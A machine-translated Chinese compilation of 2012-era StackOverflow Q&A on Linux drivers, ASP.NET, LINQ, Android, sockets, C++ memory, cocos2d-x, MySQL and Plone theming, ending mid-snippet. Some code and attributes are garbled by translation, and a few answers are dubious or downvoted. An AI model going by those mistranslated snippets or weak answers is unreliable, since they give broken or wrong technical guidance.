# StackOverflow 问答 11735000-11735999

# linux - 修改/重新加载现有 Linux 驱动程序的最快方法

> ID：11735000
> 
> 赞同：1
> 
> 时间：2012-07-31T07:16:11.750
> 
> 标签：linux, driver

我正在尝试了解 USB Wi-Fi 适配器的现有 Linux Wi-Fi 驱动程序。虽然我可以阅读 C 代码，但我还希望能够在驱动程序的某些关键位置插入调试/打印语句，以查看它在执行时的行为。在 Linux 系统上，修改驱动程序代码后，如何将其加载到内核中以替换旧驱动程序？有没有办法直接在旧驱动程序上“热插拔替代”它，还是比这更复杂？

我打算在一个消耗性虚拟机中执行此操作，所以我不担心会弄乱原始驱动程序，因为它很重要。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T10:25:35.277

如果驱动程序被编译为模块，您需要做的就是添加调试打印输出，编译模块、`rmmod`原始模块、`insmod`新模块并像往常一样启动 WLAN 连接。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-05T18:08:27.983

如果您想即时测试和编辑：

*   `lsmod`查找模块名称
*   `rmmod`它
*   编辑源
*   Make sur 你有一个 Makefile ：`obj-m := module_name.o`
*   重新编译（在 Ubuntu 上）：`make -C /usr/src/linux-headers-'uname -r' M='pwd' modules`
*   `insmod module_name.ko`

如果它是一个设备模块，您可能想要 rm /dev 中的任何设备，然后`mknod`重新制作它们（参见 mknod man），最后`chmod`更正权限。

# javascript - 将 JSON 对象列表传递给操作

> ID：11735002
> 
> 赞同：0
> 
> 时间：2012-07-31T07:16:14.013
> 
> 标签：javascript, asp.net-mvc, json, asp.net-mvc-2

我的 ASP.NET MVC 2 项目中有一个这样的模型，

```
public class HomeModel
    {
        public string Name { get; set; }

        public int HomeCount { get; set; }

        private List<string> _list;
        public List<string> List
        {
            get
            {
                if (_list == null)
                {
                    _list = new List<string>();
                }
                return _list;
            }
            set
            {
                _list = value;
            }
        }
        private List<ChildModel> _children;
        public List<ChildModel> Children
        {
            get
            {
                if (_children == null)
                {
                    _children = new List<ChildModel>();
                }
                return _children;
            }
            set
            {
                _children = value;
            }
        }
    }
    public class ChildModel
    {
        public string Address { get; set; }
    } 
```

脚本为

```
var obj = new Object();
            obj.Name = "MyName";
            obj.HomeCount = 56;

            obj.List = new Array();
            obj.List[0] = "AAA";
            obj.List[1] = "bbb";
            var child = new Object();
            child.Address = "ccc";
            obj.Children = new Array();
            obj.Children[0] = child;
            var child2 = new Object();
            child.Address = "ddd";
            obj.Children[1] = child2;

            jQuery.ajaxSettings.traditional = true
            $.post('/Home/Test',obj, function (data) { }); 
```

我的问题是即使字符串列表是在控制器的操作中生成的，对象列表的计数是 0。谁能告诉我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:16:49.550

当您将对象作为 jQuery 的 ajax 负载提交时，它会转换为数据的键/值对。例如，如果这是 $.get 而不是 $.post，你会得到

?name=MyName 等。

这篇文章应该可以为您提供所需的内容：http: [//www.intelligrape.com/blog/2010/06/11/jquery-send-json-object-with-an-ajax-request/](http://www.intelligrape.com/blog/2010/06/11/jquery-send-json-object-with-an-ajax-request/)

我还在这里推荐 json/object 字面量表示法：

var obj = { 名称：“MyName”，HomeCount：56，列表：[“AAA”，“bbb”]，孩子：{ 地址：“ccc”，孩子：[ //etc ] } }

有关规范，请参阅 json.org，有关验证，请参阅 jslint.com/jshint.com。

# c# - 根据C#中的条件将数据表中的数据合并为一行

> ID：11735003
> 
> 赞同：0
> 
> 时间：2012-07-31T07:16:18.700
> 
> 标签：c#, asp.net, datatable

我需要根据我的 c# 页面中的条件将数据表中的数据合并到一行中

例如

![ ](../Images/d02fca030db88d6c354f1e1af70b3c81.png)

在此表中，我有不同的行，但最后三行具有相同的日期。我需要将表中的数据按日期组合

即在具有相同日期的行中，必须添加其他列中的数据，如下图所示

![ ](../Images/8a2f4ecb30fc4bca21c5feeae6987538.png)

我的数据表包含非常大量的数据，所以你能在更少的迭代中帮助解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:49:41.550

我会使用 linq 来实现这一点，我写了一个小案例，您可以对其进行一些修改以适应您的情况：

```
 var list = new List<Model>();

    list.Add(new Model { Date = DateTime.Now, Total = 3 });
    list.Add(new Model { Date = DateTime.Now, Total = 3 });
    list.Add(new Model { Date = DateTime.Now, Total = 3 });

    var combined = from item in list
                   group item by new { item.Date, item.Total }
                   into grouped
                   select new Model
                       {
                           Date = grouped.Key.Date,
                           Total = grouped.Sum(i => i.Total)
                       }; 
```

这`Model`是您的模型，其中包含表中显示的数据。基本上你在所有领域做一个小组，你需要是一样的。然后，您将创建一个新的“IEnumerable”，其中填充了分组条目。在这里，您可以使用 group-key 中的日期，并且可以对其他值求和。

- 编辑

要将所有内容作为行直接添加到 a 中`DataTable`，您可以执行以下操作：

```
 var list = new List<Model>();

        list.Add(new Model { Date = DateTime.Today, Total = 3 });
        list.Add(new Model { Date = DateTime.Today, Total = 3 });
        list.Add(new Model { Date = DateTime.Today, Total = 3 });

        var table = new DataTable();
        table.Columns.Add("Date");
        table.Columns.Add("Total");

        foreach (var grouped in from item in list
                                group item by new { item.Date, item.Total }
                                    into grouped
                                    select grouped)
        {
            table.Rows.Add(grouped.Key.Date, grouped.Sum(i => i.Total));
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:13:19.017

I got the solution by doing this. The post of Bjorn helped me.

```
var drdatedisp = from row in dtfullreport.AsEnumerable()
                  group row by row.Field<string>("Order_Date") into g
                  select new
                  {
                      Order_Date = g.Key,
                      totalAmt = g.Sum(a => a.Field<int>("Item_Quantity"))

                  };
 DataTable dtdatedisp = new DataTable();
 dtdatedisp.Columns.Add("Order_Date");
 dtdatedisp.Columns.Add("Quantity");
 dtdatedisp.Rows.Clear();
 foreach (var g in drdatedisp)
 {
     DataRow newRow1 = dtdatedisp.NewRow();
     newRow1[0] = g.Order_Date;
     newRow1[1] = g.totalAmt;
     dtdatedisp.Rows.Add(newRow1);
 } 
```

also I added the data from the variables to a datatable.

# android - 如何记录安卓手机的活动

> ID：11735006
> 
> 赞同：2
> 
> 时间：2012-07-31T07:16:29.573
> 
> 标签：android, hook

我希望编写一个调整来记录在有根 Android 手机上运行的所有活动。比如我想记录如下信息：

*   2012-07-31 15:03 app1:Activity01:onCreate()
*   2012-07-31 15:04 app1:Activity01:onStart()
*   ...
*   2012-07-31 15:05 app1:Activity01:onPause()
*   2012-07-31 15:05 app2:Activity01:onResume()

有可能做到吗？如果是这样，请告诉我在哪里可以找到我应该学习的相关信息、书籍或领域知识来完成这项任务。我是 Android 编程新手，但熟悉 C++ 和 Java。

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T12:24:36.450

每个 Android 应用程序都在其自己的进程中执行，该进程运行自己的 Dalvik VM 实例。VM 通常不会提供您正在寻找的跨进程边界的信息。

如果您真的想破解您的 Android，您可以研究以下两种方法：

*   修改 Android API 类，基本上是构建您自己的 android.jar，您可以在其中覆盖和扩展现有功能。
*   尝试使用 VM 的调试工具来访问其运行时状态（参见例如[Dalvik VM 调试监视器](http://www.milk.com/kodebase/dalvik-docs-mirror/docs/debugmon.html "Dalvik 调试监视器")）。

底线：与那些黑客相比，扎根手机是小菜一碟。

但是，出于性能和稳定性的原因，我建议不要以您描述的方式“挂钩”到 Android 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T11:52:03.210

所以答案是在普通的应用程序中是不可能的，即使在有根手机上也是如此。看评论 ：-）

# github - 由主存储库管理的 GitHub wiki

> ID：11735012
> 
> 赞同：4
> 
> 时间：2012-07-31T07:16:59.430
> 
> 标签：github, repository, wiki

我想在开发代码的同时为我的项目管理 GitHub wiki。例如：

**分支机构**

*   大师（稳定版）
    *   开发（下一个版本的开发）
    *   其他...（可能的其他开发/功能分支）

理想情况下，我希望 wiki 包含在项目的子文件夹（例如 /wiki）中。然后，当我对代码进行更改时，我还可以同时更新 wiki（代码 + 文档更改）。这也意味着我的所有开发代码和文档都将独立于“开发”分支中，直到我与“主”分支合并。希望即使通过手动过程，GitHub wiki 也会在与 master 合并后更新以反映更改。

我已经查看了 Git 的子模块功能，但据我了解，这通常指向一个修订版。我想以某种方式跟踪我的代码开发，以便分支和合并可以正常工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:31:24.853

如“[子模块的真实性质](https://stackoverflow.com/questions/1979167/git-submodule-update)”中所述，您可以在子模块中进行修改和更新，只要您还提交父 repo 以记录您的“ `wiki`”子 repo 的新状态。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-29T05:14:08.800

如果您打算使用 Gollum 在本地计算机上显示和工作 GitHub wiki（您可能应该这样做），那么如果您使用子模块，您将遇到麻烦。

Gollum 想要对本地 Git 存储库进行本地提交（但不是推送），但在子模块中 .git 实际上是一个包含本地存储库的文件，而不是真正的 Git 存储库。这会导致咕噜破碎。

子模块也存在版本不耦合到父存储库的问题，并且它们没有完全解耦。每次您进行文档更改时，让源代码存储库想要推送新的 wiki 版本号（而不是 wiki 内容）是一件令人讨厌的事情。

我使用的解决方案只是将 wiki 存储库克隆到主项目目录内的目录中，并将其添加到 .gitignore。通过为跨项目的目录使用一致的名称（例如 github-wiki），将 wiki 不在 .gitignore 中并意外上传到主存储库的可能性降到最低。

为了保持一致性，他的方法也适用于 GitHub 页面，尽管这是不必要的，因为他们没有遇到 Gollum 的问题。

# ios - NSDateFormatter：仅当应用程序针对该语言进行本地化时才显示本地化日期

> ID：11735013
> 
> 赞同：4
> 
> 时间：2012-07-31T07:16:59.757
> 
> 标签：ios, cocoa, localization, nsdateformatter, nslocale

我目前正在为 iPhone 编写一个与日期密切相关的应用程序。我`NSDateFormatter`用来将日期转换为字符串。方便地`NSDateFormatter`根据区域格式自动创建用户语言的字符串。因为我无法在所有可能的语言和地区本地化我的应用程序，所以该应用程序仅本地化为英语、德语、西班牙语和其他一些语言。

例如，当应用程序为法语用户运行时，应用程序默认为英语。这很好，但日期仍将使用法语进行转换。这会产生像“Month: Juillet”这样的字符串，而不是“Month: July”。

如何使`NSDateFormatter`始终使用应用程序运行的语言？我知道我可以`NSLocalizedString()`用来本地化`NSLocale`标识符，但这会导致不正确的区域设置。

当用户通常使用“en_GB”区域并且我的应用程序通常针对英语进行本地化时，我希望`NSDateFormatter`使用“en_GB”而不仅仅是“en”或“en_US”。当用户运行法语时，我希望语言环境为“en”，如果他在“de_DE”区域运行应用程序，我也希望日期格式为“de_DE”，因为该应用程序支持德语。

问候， 法比安

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T08:56:24.073

When you create the date formatter, it initialises it's style from the current locale, but you can override this.

[not tested] You can get the best locale from the users list and your available locale using NSBundle:

```
+ (NSArray *)preferredLocalizationsFromArray:(NSArray *)localizationsArray 
```

NSFormatter:

```
+ (NSString *)dateFormatFromTemplate:(NSString *)template options:(NSUInteger)opts locale:(NSLocale *)locale 
```

Should give you a localised format string for the specified locale.

You can then use setDateFormat to override the initial date format for the formatter.

# c - Linux 服务器套接字 - 错误的文件描述符

> ID：11735014
> 
> 赞同：9
> 
> 时间：2012-07-31T07:17:01.237
> 
> 标签：c, linux, sockets

我在 Linux 下的服务器套接字有问题。由于某种我不知道的原因，服务器套接字消失了，并且`Bad file descriptor`在等待传入连接的选择调用中出现错误。当我在不同的线程中关闭不相关的套接字连接时，总是会出现此问题。这发生在具有 2.6.36 内核的嵌入式 Linux 上。

有谁知道为什么会发生这种情况？服务器套接字可以简单地消失导致正常`Bad file descriptor`吗？

**编辑：** 其他套接字代码实现 VNC 服务器并在完全不同的线程中运行。其他代码的唯一特别之处是使用，`setjmp/longjmp`但这不应该是一个问题。

创建服务器套接字的代码如下：

```
int server_socket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

struct sockaddr_in saddr;
memset(&saddr, 0, sizeof(saddr));
saddr.sin_family = AF_INET;
saddr.sin_addr.s_addr = htonl(INADDR_ANY);
saddr.sin_port = htons(1234);

const int optionval = 1;
setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &optionval, sizeof(optionval));

if (bind(server_socket, (struct sockaddr *) &saddr, sizeof(saddr)) < 0) {
    perror("bind");
    return 0;
}

if (listen(server_socket, 1) < 0) {
    perror("listen");
    return 0;
} 
```

我使用以下代码等待传入连接：

```
static int WaitForConnection(int server_socket, struct timeval *timeout)
{
    fd_set read_fds;

    FD_ZERO(&read_fds);
    int max_sd = server_socket;
    FD_SET(server_socket, &read_fds);

    // This select will result in 'EBADFD' in the error case.
    // Even though the server socket was not closed with 'close'.
    int res = select(max_sd + 1, &read_fds, NULL, NULL, timeout);
    if (res > 0) {
        struct sockaddr_in caddr;
        socklen_t clen = sizeof(caddr);
        return accept(server_socket, (struct sockaddr *) &caddr, &clen);
    }

    return -1;
} 
```

**编辑：** 当问题发生时，我目前只是重新启动服务器，但我不明白为什么服务器套接字 id 会突然变成无效的文件描述符：

```
int error = 0;
socklen_t len = sizeof (error);
int retval = getsockopt (server_socket, SOL_SOCKET, SO_ERROR, &error, &len );
if (retval < 0) {
    close(server_socket);
    goto server_start;
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2015-02-27T09:29:35.673

套接字（文件描述符）通常会遇到与`C`. 每当您关闭套接字时，请不要忘记分配`-1`给保留描述符值的变量：

```
close(socket);
socket = -1; 
```

正如您对`C`指针所做的那样

```
free(buffer);
buffer = NULL; 
```

如果您忘记这样做，您可以稍后关闭套接字两次，`free()`如果它是一个指针，您会记住两次。

另一个问题可能与人们通常忘记的事实有关：*UNIX 环境中的文件描述符从`0`*. 如果在代码中的某个地方你有

```
struct FooData {
    int foo;
    int socket;
    ...
}

// Either
FooData my_data_1 = {0};
// Or
FooData my_data_2;
memset(&my_data_2, 0, sizeof(my_data_2)); 
```

在这两种情况下`my_data_1`，`my_data_2`都具有有效的描述符 ( `socket`) 值。后来，一些负责释放`FooData`结构的代码可能会盲目地`close()`这个描述符，那恰好是你服务器的监听套接字（`0`）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-10-09T09:19:15.833

1-关闭你的套接字：

```
close(sockfd); 
```

2-从选择集中清除您的套接字文件描述符：

```
FD_CLR(sockfd,&master); //opposite of FD_SET 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:21:42.870

您没有区分代码中的两种错误情况，两者都可能失败`select`或`accept`. 我的猜测是，您只是有一个超时时间，并且 select 会返回`0`。

*   打印`retval`并`errno`在`else`分支中
*   `accept`分别考察返回值
*   确保在每个系统调用之前`errno`重置`0`

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-07-31T07:30:24.253

在 Linux 中，一旦你创建了一个连接并且它被关闭，那么你必须等待一段时间才能建立新的连接。在 Linux 中，socket 不会释放端口号。一旦你关闭套接字。

**或者**

你重用了socket，那么坏的文件描述符就要来了。

# c# - 如何以 P2P 方式使用 C# 和 ASP.NET 流式传输多媒体文件？

> ID：11735016
> 
> 赞同：3
> 
> 时间：2012-07-31T07:17:03.820
> 
> 标签：c#, asp.net, html, real-time, p2p

所以我想做的是建立一个自定义的网络播放器，它应该具有允许任何用户从他的本地硬盘中选择一个文件并播放该文件的功能，以便其他人可以实时查看它，就像进行视频聊天，但不是网络摄像头，而是正在流式传输的视频剪辑。

到目前为止，我遇到的是微软的 SmoothStreaming Framework，但它并没有太大帮助。请帮忙。问候。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T07:22:55.300

看下面的帖子，希望对你有帮助。

*   [使用 Windows Media Services 和 ASP.NET 进行流式传输](http://www.devsource.com/c/a/Techniques/Streaming-with-Windows-Media-Services-and-ASPNET/)
*   [Microsoft 媒体平台：播放器框架](http://smf.codeplex.com/)

# c++ - char 双指针程序中的访问冲突

> ID：11735022
> 
> 赞同：0
> 
> 时间：2012-07-31T07:17:17.640
> 
> 标签：c++, pointers, char

这段代码给了我运行时异常：`Unhandled exception at 0x00401189 in ControlFileChanges.exe: 0xC0000005: Access violation writing location 0xbaadf00d`在第一个 strcpy 命令。

```
char** withStrings(string s1, string s2, string s3, string s4, string s5)
{
char** pipes;
pipes = (char**) malloc(sizeof(*pipes)*5);

strcpy(pipes[0],s1.c_str());
strcpy(pipes[1],s2.c_str());
strcpy(pipes[2],s3.c_str());
strcpy(pipes[3],s4.c_str());
strcpy(pipes[4],s5.c_str());

return pipes;
} 
```

知道问题可能是什么吗？（这是我在实际代码中使用类似逻辑的示例）。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-31T07:18:38.600

您没有将内存分配给`pipes[0]`,`pipes[1]`等。

由于这是 C++ 而不是 C，您是否考虑过使用`new`而不是`malloc`？或者也许使用 a`vector`或`string`s ？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T07:19:59.703

常数`0xbaadf00d`在这里告诉我们很多。这表明您使用的是 Microsoft，您已在调试模式下分配了一些堆内存并且没有对其进行初始化。

您可以看到这一点 - 您已经调用`malloc()`了. 也就是说，since是一个指向指针的指针，它只分配你指向指针的指针，而不是它们指向的任何东西。`char**``char*``strcpy``char**``char**`

如果可以的话，我建议完全避免使用 C 字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T10:29:18.037

`char** pipes;`- 是一个指针数组，它将存储 5 个字符串的地址。因此，您已在以下语句中分配内存用于存储 5 个字符串的地址。

管道 = (char**) malloc(sizeof(*pipes)*5);

在此之后，您必须分配内存来存储每个字符串。因此，如下所示更新您的代码。

```
#define MAX_NO_STRING 5
#define MAX_STR_SIZE 50

pipes = (char**) malloc(sizeof(char*)*MAX_NO_STRING); 
for(i = 0; i < MAX_NO_STRING; i++)
{
    pipes[i] = (char*)malloc(sizeof(char) * MAX_STR_SIZE);
} 
```

注意：注意 malloc 的 NULL 检查

# android - 基于 cocos2dx 1.0.1 0.12.0 的 android 应用程序在第二次运行时崩溃

> ID：11735023
> 
> 赞同：3
> 
> 时间：2012-07-31T07:17:21.800
> 
> 标签：android, cocos2d-iphone, cocos2d-x

我根据源代码中的测试项目修改了粒子测试项目。更改 Cocos2dxActivity.java 文件

```
public static void terminateProcess(){
    android.os.Process.killProcess(android.os.Process.myPid());
} 
```

到

```
public static void terminateProcess(){
    finish();
} 
```

我在 cocos2d-2.0-rc2-x-2.0.1 上使用此更改，Activity 可以成功运行第二次。但是在 cocos2d-1.0.1-x-0.12.0（甚至 cocos2d-1.0.1-x-0.13.0-beta）上，Activity 第一次运行成功，第二次失败，第三次成功。

新 AppDelegate 上的代码失败。

```
void Java_org_cocos2dx_lib_Cocos2dxRenderer_nativeInit(
  JNIEnv*  env, jobject thiz, jint   w, jint h)
{
   if (!cocos2d::CCDirector::sharedDirector()->getOpenGLView())
   {
  cocos2d::CCEGLView *view = &cocos2d::CCEGLView::sharedOpenGLView();
      view->setFrameWidthAndHeight(w, h);
      cocos2d::CCDirector::sharedDirector()->setOpenGLView(view);
      //Code failed here.
      AppDelegate *pAppDelegate = new AppDelegate();
      cocos2d::CCApplication::sharedApplication().run();
   }
   else
   {
      cocos2d::CCTextureCache::reloadAllTextures();
      cocos2d::CCDirector::sharedDirector()->setGLDefaultValues();
   }
} 
```

这是崩溃日志

```
07-31 15:30:05.520: I/Adreno200-EGLSUB(134): <CreateImage:896>: Android Image
07-31 15:30:05.520: I/Adreno200-EGLSUB(134): <GetImageAttributes:1105>: RGBA_8888
07-31 15:30:05.540: V/PhoneStatusBar(435): setLightsOn(true)
07-31 15:30:05.600: D/memalloc(134): ion: Allocated buffer base:0x4239c000 size:1658880 fd:53 1000000 0
07-31 15:30:05.600: D/memalloc(803): ion: Mapped buffer base:0x5cfd1000 size:1658880 offset:0 fd:81
07-31 15:30:05.610: I/Adreno200-EGLSUB(803): <ConfigWindowMatch:2104>: Format RGB_565.
07-31 15:30:05.610: D/memalloc(134): ion: Allocated buffer base:0x425f0000 size:798720 fd:60 1000000 0
07-31 15:30:05.610: D/memalloc(803): ion: Mapped buffer base:0x5d166000 size:798720 offset:0 fd:84
07-31 15:30:05.630: I/Adreno200-EGLSUB(134): <CreateImage:896>: Android Image
07-31 15:30:05.630: I/Adreno200-EGLSUB(134): <GetImageAttributes:1105>: RGBA_8888
07-31 15:30:05.640: I/ActivityManager(315): Displayed com.test.benchmark/org.cocos2dx.tests.TestsDemoV1: +167ms
07-31 15:30:05.640: D/particle(803): Enter OpenCLView
07-31 15:30:05.640: D/particle(803): Enter OpenCLView 2
07-31 15:30:05.640: D/particle(803): Enter OpenCLView 3
07-31 15:30:05.650: D/particle(803): Enter OpenCLView 4
07-31 15:30:05.650: A/libc(803): Fatal signal 11 (SIGSEGV) at 0xdeadbaad (code=1)
07-31 15:30:05.660: D/memalloc(803): ion: Unmapping buffer  base:0x5c2d9000 size:1658880
07-31 15:30:05.660: D/memalloc(134): ion: Freeing buffer base:0x42f50000 size:1658880 fd:47
07-31 15:30:05.660: D/memalloc(134): ion: Unmapping buffer  base:0x42f50000 size:1658880
07-31 15:30:05.660: D/memalloc(803): ion: Unmapping buffer  base:0x5c56e000 size:1658880
07-31 15:30:05.990: D/memalloc(134): ion: Freeing buffer base:0x4315c000 size:1658880 fd:56
07-31 15:30:05.990: D/memalloc(134): ion: Unmapping buffer  base:0x4315c000 size:1658880
07-31 15:30:06.000: V/AudioHardwareMSM8660(137): AudioStreamOutMSM72xx::write(0x1c918, 4800) dev = speaker_stereo_rx
07-31 15:30:06.160: I/DEBUG(30740): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
07-31 15:30:06.160: I/DEBUG(30740): Build fingerprint: 'Xiaomi/mione_plus/mione_plus:4.0.4/IMM76D/2.7.20:user/release-keys'
07-31 15:30:06.160: I/DEBUG(30740): pid: 803, tid: 921  >>> com.ludashi.benchmark <<<
07-31 15:30:06.160: I/DEBUG(30740): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr deadbaad
07-31 15:30:06.160: I/DEBUG(30740):  r0 deadbaad  r1 00000001  r2 40000000  r3 00000000
07-31 15:30:06.160: I/DEBUG(30740):  r4 00000000  r5 00000027  r6 00000000  r7 581adf48
07-31 15:30:06.160: I/DEBUG(30740):  r8 5ca51c10  r9 581adf40  10 00000008  fp 5ca51c24
07-31 15:30:06.160: I/DEBUG(30740):  ip 00000000  sp 5ca51b90  lr 400cd4b9  pc 400c9c18  cpsr 60000030
07-31 15:30:06.160: I/DEBUG(30740):  d0  3a6432736f636f63  d1  696c70704143433a
07-31 15:30:06.160: I/DEBUG(30740):  d2  3a3a6e6f69746163  d3  63696c7070414343
07-31 15:30:06.160: I/DEBUG(30740):  d4  0000000000000000  d5  0000000000000000
07-31 15:30:06.160: I/DEBUG(30740):  d6  0000000000000000  d7  0000000000000000
07-31 15:30:06.160: I/DEBUG(30740):  d8  436a000043340000  d9  43f00000000000ea
07-31 15:30:06.160: I/DEBUG(30740):  d10 0000000044138000  d11 0000000000000000
07-31 15:30:06.170: I/DEBUG(30740):  d12 0000000000000000  d13 0000000000000000
07-31 15:30:06.170: I/DEBUG(30740):  d14 0000000000000000  d15 0000000000000000
07-31 15:30:06.170: I/DEBUG(30740):  d16 64656c6961662022  d17 2220656c6966203a
07-31 15:30:06.170: I/DEBUG(30740):  d18 0000000000000000  d19 0000000000000000
07-31 15:30:06.170: I/DEBUG(30740):  d20 0000000000000000  d21 0000000000000000
07-31 15:30:06.170: I/DEBUG(30740):  d22 0000000000000000  d23 0000000000000000
07-31 15:30:06.170: I/DEBUG(30740):  d24 3f582b387b22f3c1  d25 3f6dcabc4571abc1
07-31 15:30:06.170: I/DEBUG(30740):  d26 3f30837711244472  d27 3f4375429245411f
07-31 15:30:06.170: V/AudioPolicyManager(137): stopOutput() output 1, stream 1
07-31 15:30:06.170: V/AudioPolicyManagerBase(137): changeRefCount() stream 1, count 0
07-31 15:30:06.170: V/AudioPolicyManagerBase(137): getNewDevice() selected device 0
07-31 15:30:06.170: V/AudioPolicyManager(137): setOutputDevice() output 1 device 0 delayMs 0
07-31 15:30:06.170: V/AudioPolicyManager(137): setOutputDevice() setting same device 0 or null device for output 1
07-31 15:30:06.180: I/DEBUG(30740):  d28 3f133abc51b768d7  d29 3f1420ec8fb87f66
07-31 15:30:06.180: I/DEBUG(30740):  d30 3efb2a7074bf7ad4  d31 3ff0000000000000
07-31 15:30:06.180: I/DEBUG(30740):  scr 60000012
07-31 15:30:06.360: I/DEBUG(30740):          #00  pc 00017c18  /system/lib/libc.so
07-31 15:30:06.360: I/DEBUG(30740):          #01  pc 0001edb4  /system/lib/libc.so (__assert2)
07-31 15:30:06.360: I/DEBUG(30740):          #02  pc 0011ff4c 
```

有人可以帮我解决这个问题吗？我试图在更新日志上寻找任何固定的东西，但没有任何想法。谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T15:41:39.097

```
检查这一行：07-31 15:30:05.650: A/libc(803): Fatal signal 11 (SIGSEGV) at 0xdeadbaad (code=1)

试

07-31 15:30:06.000: V/AudioHardwareMSM8660(137): AudioStreamOutMSM72xx::write(0x1c918, 4800) dev = speaker_stereo_rx
```

你有一个例外。这不是编译错误，您正在尝试写入音频，但您无权访问。检查文件是否打开，文件是否存在等。

# mysql - 将一列数据显示到两列

> ID：11735024
> 
> 赞同：-1
> 
> 时间：2012-07-31T07:17:30.220
> 
> 标签：mysql, sql

表 A

```
| SLNO | TYPENAME | TYPEMODE |
------------------------------
|    1 |  Act.Alw |        A |
|    2 |  Canteen |        D | 
```

我想根据它的 typmode 显示两列

使用 UNION ALL 我得到

```
| Addition | Deduction |
------------------------
| Act.Alw  |           |
|          |  Canteen  | 
```

我想要这样的显示。加减法是别名

```
| ADDITION | DEDUCTION |
------------------------
|  Act.Alw |   Canteen | 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T06:46:56.550

您可以`CASE`为此使用语句。要对它们进行分组，您需要使用`GROUP_CONCAT`如下函数：

```
SELECT GROUP_CONCAT(CASE WHEN typemode = 'A' 
             THEN typename ELSE NULL END) AS Addition
      ,GROUP_CONCAT(CASE WHEN typemode = 'D' 
              THEN typename ELSE NULL END) AS Deduction
FROM Table1 
```

输出：

```
| ADDITION | DEDUCTION |
------------------------
|  Act.Alw |   Canteen | 
```

### [看到这个 SQLFiddle](http://sqlfiddle.com/#!2/f11d2/4)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:21:59.327

看起来您需要使用联接而不是联合。但是，如果您可以多解释一下您要完成的工作，并可能发布您当前尝试运行的 sql 查询，那将会很有帮助。

# android - 在 Android 环境中单击文本框时，页脚导航栏向上移动

> ID：11735025
> 
> 赞同：1
> 
> 时间：2012-07-31T07:17:31.150
> 
> 标签：android, jquery-mobile, cordova, textbox, footer

我正在使用 jqm 和 phonegap 开发一个应用程序。在 Android 环境中，当我单击文本字段时，jqm 页脚导航栏会向上移动。在 iOS 环境中，这种行为不会出现。我使用的是 JQM 1.1.0 并使用 android 2.3 进行了测试。如何解决这种行为？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-09-27T06:33:19.753

我和你有同样的问题。修复方法是将此行添加到相应的导航栏：

> 数据隐藏期间焦点“”数据点击切换=“假”

这可以防止在单击或点击 HTML 中的空白区域时在导航栏、页眉或页脚中出现不需要的行为

# css - 带有基于 Sunburst 的 plone.app.theming 的自定义 Plone 主题 - 缺少 public.css

> ID：11735027
> 
> 赞同：2
> 
> 时间：2012-07-31T07:17:35.757
> 
> 标签：css, plone, theming, diazo

我想按照 Martin Aspeli 在他的“Professional Plone 4 Development”一书中的说明，使用 Diazo/plone.app.theming 构建一个自定义的 Plone 主题。就像在书中我选择了引入所有 Plone css 的方式（默认 Sunburst 主题）。我的问题：所有这些 css 都包括在内 - 除了 public.css。这意味着编辑栏损坏和其他一些视觉问题。hack 是将 public.css 复制到我的资源目录中并将其包含到我自己的 cssregistry.xml 中。但我想做干净。为什么不包括这个单个文件（但其他文件是）？我多次重新安装我的主题以确保我的所有更改都适用。

这是我的 cssregistry.xml：

```
<?xml version="1.0"?>
<object name="portal_css">
  <stylesheet id="++theme++myproject.theme/css/main.css"
              expression="request/HTTP_X_THEME_ENABLED | nothing"
              applyPrefix="True" />
</object> 
```

这里是我的 rules.xml 中与头部相关的部分：

```
<?xml version="1.0" encoding="UTF-8"?>
<rules
    xmlns="http://namespaces.plone.org/diazo"
    xmlns:css="http://namespaces.plone.org/diazo/css"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

    <!-- Rules applying to standard Plone pages -->
    <rules css:if-content="#visual-portal-wrapper">
        <theme href="index.html" />

        <drop theme="/html/head/meta" />
        <drop theme="/html/head/title" />
        <drop theme="/html/head/base" />
        <drop theme="/html/head/style" />
        <drop theme="/html/head/script" />
        <drop theme="/html/head/link" />
        <drop theme="/html/head/comment()" />

        <after content="/html/head/meta"
               theme-children="/html/head" />
        <after content="/html/head/title"
               theme-children="/html/head" />
        <after content="/html/head/base | /html/head/style | /html/head/script | /html/head/link | /html/head/comment()"
               theme-children="/html/head" />
... 
```

也就是说，在启用我的主题的情况下，生成的 head-tag 的 HTML 标记的外观：

```
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta content="Herzlichen Glückwunsch! Sie haben das professionelle Open-Source Content-Management-System Plone erfolgreich installiert." name="description" />
  <meta name="viewport" content="width=device-width, initial-scale=0.6666, maximum-scale=1.0, minimum-scale=0.6666" />
  <meta name="generator" content="Plone - http://plone.org" />
  <title>
  Willkommen bei Plone — My-Project</title>
  <base href="http://localhost:8080/my-project/front-page" />
  <!--[if lt IE 7]> </base> <![endif]-->
  <link rel="alternate" data-kss-base-url="kss-base-url" href="http://localhost:8080/my-project/front-page/" />
